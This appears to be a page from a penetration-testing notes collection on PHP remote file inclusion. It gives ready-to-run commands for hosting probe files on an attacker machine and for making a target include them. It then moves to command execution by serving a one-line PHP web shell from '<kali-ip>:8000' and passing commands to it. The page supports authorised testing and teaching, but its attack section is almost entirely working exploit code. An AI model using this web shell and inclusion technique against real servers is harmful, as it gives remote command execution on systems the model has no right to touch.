# RFI

[← Foothold](../02-foothold.md) · [LFI](lfi.md) · [SSRF](ssrf.md)

## Serve two probes

```bash
RFI_DIR=$(mktemp -d)
printf 'RFI_FETCH_42\n' > "$RFI_DIR/probe.txt"
printf '%s\n' "<?php echo 'RFI_EXEC_42'; ?>" > "$RFI_DIR/probe-php.txt"
python3 -m http.server 8000 --bind 0.0.0.0 --directory "$RFI_DIR"
```

In another terminal:

```bash
curl -sS -G 'http://<target>/index.php' \
  --data-urlencode 'page=http://<kali-ip>:8000/probe.txt'
curl -sS -G 'http://<target>/index.php' \
  --data-urlencode 'page=http://<kali-ip>:8000/probe-php.txt'
```

| Result | Read it as |
| --- | --- |
| GET in your server log | Target fetched the URL; could also be SSRF or a remote read. |
| `RFI_FETCH_42` in target response | Remote text was returned. |
| `RFI_EXEC_42` without literal PHP source | Remote PHP was interpreted. |

## Command execution

After `RFI_EXEC_42` works:

```bash
printf '%s\n' '<?php system($_GET["cmd"]); ?>' > "$RFI_DIR/cmd.php"
curl -sS -G 'http://<target>/index.php' \
  --data-urlencode 'page=http://<kali-ip>:8000/cmd.php' \
  --data-urlencode 'cmd=id'
```

No GET: check target → `<kali-ip>:8000` and app-added prefixes/extensions. PHP remote reads use `allow_url_fopen`; remote `include`/`require` also needs `allow_url_include` (off by default).

References: [PHP remote files](https://www.php.net/manual/en/features.remote-files.php) · [PHP settings](https://www.php.net/manual/en/filesystem.configuration.php) · [OWASP file inclusion](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion/)
